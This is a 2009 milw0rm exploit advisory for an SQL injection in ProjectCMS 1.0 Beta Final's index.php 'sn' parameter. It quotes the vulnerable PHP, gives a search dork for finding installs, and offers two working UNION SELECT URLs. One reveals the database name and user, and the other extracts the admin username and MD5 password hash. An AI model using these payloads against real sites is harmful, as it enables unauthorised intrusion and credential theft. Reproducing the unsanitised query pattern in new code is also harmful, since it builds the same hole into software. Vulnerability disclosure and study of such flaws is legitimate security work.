<html><head><title>ProjectCMS 1.0b (index.php sn) Remote SQL Injection Vulnerability</title></head><pre>***********************************************************************************************
***********************************************************************************************
**	       										     **
**  											     **
**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
** [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    **
**							                                     **
**    											     **
**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
**					¡PROUD TO BE SPANISH!				     **
**											     **
***********************************************************************************************
***********************************************************************************************

----------------------------------------------------------------------------------------------
|       	   	      SQL INJECTION (SQLi) VULNERABILITY	            	     |
|--------------------------------------------------------------------------------------------|
|                         	|  ProjectCMS v1.0 Beta Final  |		 	     |
|  CMS INFORMATION:		 ------------------------------			             |
|										             |
|--&gt;WEB: http://projectcms.org/        				     			     |
|--&gt;DOWNLOAD: http://projectcms.org/uploads/projectcms_1.0_BETA.zip          	             |
|--&gt;DEMO: http://projectcms.org								     |
|--&gt;CATEGORY: CMS / Portal								     |
|--&gt;DESCRIPTION: ProjectCMS is an open source community project to create          	     |
|		a simple content management system with an easy to follow install...         |
|--&gt;RELEASED: 2009-04-29								     |
|											     |
|  CMS VULNERABILITY:									     |
|											     |
|--&gt;TESTED ON: firefox 3						                     |
|--&gt;DORK: &quot;Powered by ProjectCMS&quot;							     |
|--&gt;CATEGORY: SQL INJECTION VULNERABILITY					             |
|--&gt;AFFECT VERSION: 1.0 Beta Final (maybe &lt;= ?)				 		     |
|--&gt;Discovered Bug date: 2009-04-29							     |
|--&gt;Reported Bug date: 2009-04-29							     |
|--&gt;Fixed bug date: N/A								             |
|--&gt;Info patch:	N/A								             |
|--&gt;Author: YEnH4ckEr									     |
|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							     |
|--&gt;WEB/BLOG: N/A									     |
|--&gt;COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
|--&gt;EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
----------------------------------------------------------------------------------------------


#########################
////////////////////////

SQL INJECTION (SQLi):

////////////////////////
#########################


&lt;&lt;&lt;&lt;---------++++++++++++++ Condition: magic_quotes_gpc=off +++++++++++++++++---------&gt;&gt;&gt;&gt;


-----------
VULN FILE:
-----------


	...

	$sn=$_GET[&quot;sn&quot;];
			
	if ( $sn == &quot;&quot; ) {
	    	
		$sn = &quot;1&quot;;
	}
				
	$sql=&quot;select sn,pagename,linktext,pagecontent,metakeywords,metadescription from $content where sn='$sn'&quot;;
			
	$result=mysql_query($sql,$connection) or die(mysql_error());

	...


------------------
PROOF OF CONCEPT:
------------------


http://[HOST]/[HOME_PATH]/index.php?sn=1%27+AND+0+UNION+ALL+SELECT+1,database(),3,user(),5,6/*


Return --&gt; user and database, this last in title ;)


----------
EXPLOIT:
----------


http://[HOST]/[HOME_PATH]/index.php?sn=1%27+AND+0+UNION+ALL+SELECT+1,database(),3,concat(username,0x3A3A3A,password),5,6+FROM+members+WHERE+memberid=1/*


Return --&gt; username:::password (md5 hash) of admin and database (in title too).




&lt;&lt;&lt;-----------------------------EOF----------------------------------&gt;&gt;&gt;ENJOY IT!


#######################################################################
#######################################################################
##*******************************************************************##
## ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
##*******************************************************************##
##-------------------------------------------------------------------##
##*******************************************************************##
##        GREETZ TO: JosS and all SPANISH Hack3Rs community!         ##
##*******************************************************************##
#######################################################################
#######################################################################

# milw0rm.com [2009-04-29]</pre></html>